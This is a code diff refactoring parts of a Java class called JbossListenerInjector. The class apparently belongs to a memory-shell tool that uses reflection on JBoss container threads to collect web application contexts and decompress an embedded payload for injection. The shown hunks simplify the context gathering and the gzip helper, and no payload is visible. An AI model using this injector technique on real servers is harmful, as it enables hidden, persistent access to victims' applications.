@@ -5,10 +5,7 @@ import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.util.ArrayList;
-import java.util.Arrays;
-import java.util.List;
-import java.util.Map;
+import java.util.*;
 import java.util.zip.GZIPInputStream;
 
 
@@ -47,13 +44,11 @@ public class JbossListenerInjector {
         for (Thread thread : threads) {
             if (thread.getName().contains("ContainerBackgroundProcessor")) {
                 Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
-                for (Object key : childrenMap.keySet()) {
-                    Map<?, ?> children = (Map<?, ?>) getFieldValue(childrenMap.get(key), "children");
-                    for (Object key1 : children.keySet()) {
-                        Object context = children.get(key1);
-                        if (context != null && context.getClass().getName().contains("StandardContext")) {
-                            contexts.add(context);
-                        }
+                Collection<?> values = childrenMap.values();
+                for (Object value : values) {
+                    Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
+                    for (Object context : children.values()) {
+                        contexts.add(context);
                     }
                 }
             }
@@ -136,7 +131,6 @@ public class JbossListenerInjector {
     public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
         ByteArrayOutputStream out = new ByteArrayOutputStream();
         GZIPInputStream gzipInputStream = null;
-
         try {
             gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
             byte[] buffer = new byte[4096];
@@ -144,16 +138,13 @@ public class JbossListenerInjector {
             while ((n = gzipInputStream.read(buffer)) > 0) {
                 out.write(buffer, 0, n);
             }
+            return out.toByteArray();
         } finally {
             if (gzipInputStream != null) {
-                try {
-                    gzipInputStream.close();
-                } catch (IOException ignored) {
-                }
+                gzipInputStream.close();
             }
             out.close();
         }
-        return out.toByteArray();
     }
 
     @SuppressWarnings("all")
